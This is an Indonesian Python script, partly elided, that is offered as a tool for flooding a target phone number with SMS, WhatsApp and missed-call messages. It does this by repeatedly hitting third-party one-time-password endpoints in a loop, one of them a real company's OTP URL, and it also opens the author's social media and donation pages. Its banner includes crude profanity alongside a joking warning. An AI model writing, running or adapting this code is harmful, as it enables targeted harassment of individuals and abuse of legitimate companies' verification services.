# Script Spam Sms, Call, Wa & Email
# File Name : spm.py (SPM PROJECT)
import re, sys, os, json, requests, random
...
print(f"▶ Follow Facebook gw dulu")
sleep(3)
os.system(f"xdg-open https://www.facebook.com/rifan.safutra.39")
if "linux" in sys.platform.lower():
	os.system(
			"clear"
	)
...
# --- Diisi kang --- #
creator = "pajar saputra"
facebook = "pajar saputra"
...
try:
	...
	exit(f"\n  {red}! {white}Koneksi Internet Error\n")
...
banner = f"""  
 {white}▒▒▒▒▒▒▒▒▄▄▄▄▄▄▄▄▒▒▒▒▒▒ {white}[{red}JANGAN DI SALAH GUNAKAN YA KONTOL{white}]
 {white}▒▒█▒▒▒▄██████████▄▒▒▒▒{black}|{red}- {white}Creator{red}: {white}{creator}
 {white}▒█▐▒▒▒████████████▒▒▒▒{black}|{red}- {white}Facebook{red}: {white}{facebook}
 ▒▌▐▒▒█{red}█▄▀█████{red}█▀▄█{white}█▒▒▒{black}|{red}
 ▐┼▐▒▒█{red}█▄▄▄▄█{red}█▄▄▄▄█{white}█▒▒▒{black}|{red}- {white}Tools  {red}: {white}Spam SMS & WA 
 ▐┼▐▒▒██████████████▒▒▒{black}|{red}- {white}Versi  {red}: {white}5.1
 ▐▄▐████─▀▐▐▀█─█─▌▐██▄▒ 
 {white}▒▒█████──────────▐███▌ {red}WARNING..!!
 {white}▒▒█▀▀██▄█─▄───▐─▄███▀▒{black}|{red}- {white}Gunakan dengan bijak
 {white}▒▒█▒▒███████▄██████▒▒▒{black}|{red}- {white}Bisa merusak pertemanan
 {white}▒▒▒▒▒██████████████▒▒▒{black}|{red}- {white}Bisa di tampol sama orang
 ▒▒▒▒▒█████████▐▌██▌▒▒▒ 
 {white}▒▒▒▒▒▒▒▒▒▒▒▐▒▒▒▒▌▒▒▒▒▒ 
 {white}[▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬]{white}
  {red}•> {white}Status {red}: {green}Online
  {red}•> {white}IP Kamu{red}: {green}{ip}
 {white}[▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬]{white}\033[95m     ________________________________________________________________________________________________________________________
|  |
|  |[•] C.E.O KING ARMAN       ☆☆☆☆☆☆☆☆☆☆ ■■■■■■■■ ♡♡♡♡
|  |[•] Spam sms & wa       ☆☆☆☆☆☆☆☆☆☆ ■■■■■■■■ ♡♡♡♡
|  |[•] 17-08-2022           ☆☆☆☆☆☆☆☆☆☆ ■■■■■■■■ ♡♡♡♡
...
________________________________________________________________________________________________________________________
 {white}[{green}1{white}] {white}Mulai Spam
 {white}[{green}2{white}] {white}Support Admin
 {white}[{green}3{white}] {white}Keluar
"""

class Main:
	def __init__(self):
		self.sanz = "Hendar Official"
		self.main()

	def wait(self,free_tutorial):
		for sanz in range(free_tutorial):
			free_tutorial -= 1
			sys.stdout.write(f"\r  {red}•> {white}Please wait {green}{str(free_tutorial)} {white}sec ")
			sys.stdout.flush()
			sleep(1)
	...
	def main(self):
		global nomor
		print(banner)
		sanz = input(f"     {red}[>] Input: {cyan}")
		if sanz == "1" or sanz == "01":
			print(f"\n     {red}[>] {white}Example {red}: {yellow}+6281234567xxx")
			sleep(0.5)
			nomor = input(f"     {red}[>] {white}Number  {red}: {white}").replace("+62","")
			print(f" {white}[▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")
			sleep(2.1)
			sleep(1)
			if nomor == "":
				...
				while True:
					...
					sxp_wa()
					print(f" {white}[▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")
					self.wait(5) # <- waktu delay
					sys.stdout.write("\r                           ");sys.stdout.write("\r")
					sleep(1)

		elif sanz == "2" or sanz == "02":
			print(f"\n     {red}! {white}lu bangsat")
			# Ganti link fb nya v
			os.system("LU BANGSAT")
			input(f"     {red}> {white}Press Enter to go Back ")
			print()
			os.system("python spam.py")
		elif sanz == "3" or sanz == "03":
			print(f"\n     {red}! {white}Ngopi ngab")
			# Ganti link fb nya v
			os.system("xdg-open https://saweria.co/H20Studio")
			input(f"     {red}> {white}Press Enter to go Back ")
			print()
			os.system("python spam.py")
			...
			exit(f"\n     {red}! {white}Option Does Not Exist\n")
...
class sxp_sms:
	...
	def main(self):
		...
		print(f" {white}[{green}✓{white}] {white}Successfully Send Spam Sms")
...
class sxp_wa:
	...
	def main(self):
		...
		self.wa_otp_5(nomor)
		self.wa_otp_6(nomor)
		print(f" {white}[{green}✓{white}] {white}Successfully Send Spam Wa")

class sxp_call: # Spam Call 1 Otp
	def __init__(self):
		self.sanz = "FREE TUTORIAL"
		self.req = requests.Session()
		self.main()

	def call(self, no):
		sanz = self.req.post(f"https://www.nutriclub.co.id/otp/?phone=0{no}&old_phone=0{no}",
			headers = {
				    "user-agent": agent
				  }
	    )
		if "Request misscall berhasil" in sanz.text:
			print(f"    {green}✓ {white}Successfully Send Spam Call")
		else:
			print(f"  {yellow}! {red} Call Limit, Coba besok lagi")
...
if __name__ == "__main__":
	try:
		...
		exit(f"\n     {red}! {white}Ctrl + C Detected\n")
	except requests.exceptions.ConnectionError:
		exit(f"\n     {red}! {white}Internet Connection Error\n")
